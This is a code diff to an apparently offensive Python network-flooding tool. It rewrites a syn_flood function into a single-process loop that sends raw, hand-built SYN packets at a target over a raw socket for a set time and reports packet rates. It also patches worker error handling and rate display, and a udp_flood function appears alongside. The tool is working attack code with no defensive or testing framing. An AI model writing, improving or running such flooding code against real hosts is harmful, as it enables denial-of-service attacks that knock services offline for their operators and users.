@@ -27,7 +27,7 @@ class SynFactory:
         self.dip = socket.inet_aton(target)
         self.batch = batch
         self._buf = []
-        self._lock = threading.Lock()
+        self._lock = threading.RLock()
         self._refill()
 
     def _cksum(self, data: bytes) -> int:
@@ -92,8 +92,9 @@ def _syn_worker(target: str, dur: float, wid: int, q: multiprocessing.Queue):
         try:
             sock.sendto(factory.get(), (target, 0))
             cnt += 1
-        except OSError:
-            continue
+        except OSError as e:
+            if cnt == 0:
+                q.put(("err", wid, f"sendto: {e}"))
         now = time.time()
         if now - last_report >= 2:
             q.put(("p", wid, cnt))
@@ -202,18 +203,17 @@ def _run_workers(
         except (queue.Empty, ValueError, IndexError):
             pass
 
-        elapsed = time.time() - start
-        if elapsed - (time.time() - last_report) >= 1:
+        now = time.time()
+        if now - last_report >= 1:
             total = sum(totals)
-            rate = (total - last_total) / max(
-                elapsed - (time.time() - last_report), 0.1
+            elapsed = now - start
+            rate = (total - last_total) / (now - last_report)
+            sys.stdout.write(
+                f"  {datetime.now().strftime('%H:%M:%S')}  {total:>10} pkts  {rate:>7.0f}/s\n"
             )
-            print(
-                f"  {datetime.now().strftime('%H:%M:%S')}  {total:>10} pkts  {rate:>7.0f}/s",
-                end="\r",
-            )
+            sys.stdout.flush()
             last_total = total
-            last_report = time.time()
+            last_report = now
 
     for p in procs:
         p.join()
@@ -230,9 +230,40 @@ def _run_workers(
 # Public methods
 # ---------------------------------------------------------------------------
 def syn_flood(target: str, dur: int, workers: int = 0):
-    _run_workers(
-        target, dur, _syn_worker, "syn", min_workers=max(2, os.cpu_count() or 2)
-    )
+    """SYN flood — single process. Forking breaks raw socket capabilities."""
+    log(f"syn flood on {target} for {dur}s")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    except PermissionError:
+        log("root required — run with sudo")
+        return
+
+    factory = SynFactory(target, batch=16384)
+    end = time.time() + dur
+    cnt = 0
+    last_report = time.time()
+    last_total = 0
+
+    while time.time() < end:
+        try:
+            sock.sendto(factory.get(), (target, 0))
+            cnt += 1
+        except OSError:
+            pass
+        now = time.time()
+        if now - last_report >= 1:
+            rate = (cnt - last_total) / (now - last_report)
+            sys.stdout.write(
+                f"  {datetime.now().strftime('%H:%M:%S')}  {cnt:>10} pkts  {rate:>7.0f}/s\n"
+            )
+            sys.stdout.flush()
+            last_total = cnt
+            last_report = now
+
+    elapsed = time.time() - end + dur
+    log(f"done — {cnt:,} packets in {elapsed:.1f}s ({cnt / elapsed:,.0f}/s)")
+    sock.close()
 
 
 def udp_flood(target: str, dur: int, workers: int = 0):
